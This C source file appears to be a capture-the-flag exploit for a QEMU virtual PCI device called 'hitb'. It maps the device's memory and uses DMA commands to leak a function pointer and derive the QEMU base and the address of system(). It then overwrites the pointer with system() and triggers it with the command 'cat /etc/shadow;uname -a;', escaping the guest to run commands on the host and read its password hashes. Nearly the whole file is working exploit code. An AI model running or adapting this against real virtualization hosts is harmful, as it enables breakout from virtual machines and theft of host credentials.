#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define DMA_BASE 0x40000

unsigned char* iomem;
unsigned char* dmabuf;
uint64_t dmabuf_phys_addr;

void die(const char* msg){
    perror(msg);
    exit(-1);
}

void iowrite(uint64_t addr, uint64_t value) {
    *((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr){
    return *((uint64_t*)(iomem + addr));
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void set_dma(uint64_t src, uint64_t dest, uint32_t size, uint8_t cmd){
    iowrite(0x80, src); // set dma.src
    iowrite(0x88, dest); // set dma.dest
    iowrite(0x90, size); // set dma.size
    iowrite(0x98, cmd); // set dma.cmd
}


int main(){

    // Open and map I/O memory for the hitb device
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        die("open");

    iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");

    printf("iomem: %p\n", iomem);

     // Allocate DMA buffer and obtain its physical address
	  dmabuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");

    // Convert virtual address of dma buffer to physical address
    mlock(dmabuf, 0x1000);
	  dmabuf_phys_addr = virt2phys(dmabuf);

    printf("DMA buffer (virt): %p\n", dmabuf);
	  printf("DMA buffer (phys): %p\n", (void*)dmabuf_phys_addr);

    // write address of enc ptr to dma buffer
    set_dma(DMA_BASE + 0x1000, dmabuf_phys_addr, 8, 3);
    printf("Leaking dma_enc ptr\n");

    sleep(3);

    void *hitb_enc_ptr = *((uint64_t*)dmabuf);
    void *qemu_base_addr = hitb_enc_ptr - 0x383dd0 + 0x100000;
    void *system_addr = qemu_base_addr + 0x2fdb18 - 0x100000;

    printf("DMA enc ptr: %p\n", hitb_enc_ptr);
    printf("QEMU base address: %p\n", qemu_base_addr);
    printf("System address: %p\n", system_addr);

    memcpy(dmabuf, &system_addr, 8);

    // overwrite enc ptr with system
    set_dma(dmabuf_phys_addr, DMA_BASE + 0x1000, 8, 1);

    printf("Overwrite dma_enc ptr with system()\n");
    sleep(3);

    char *exp = "cat /etc/shadow;uname -a;";
    int len = strlen(exp);

    memcpy(dmabuf, exp, len);
    set_dma(dmabuf_phys_addr, DMA_BASE + 0x100, len, 1);
    printf("Filled dma buffer with exploit string\n");

    sleep(2);

    set_dma(DMA_BASE + 0x100, dmabuf_phys_addr, 1, 7);
    printf("Call overwritten hitb.enc()\n");

    sleep(2);


	  return 0;
}
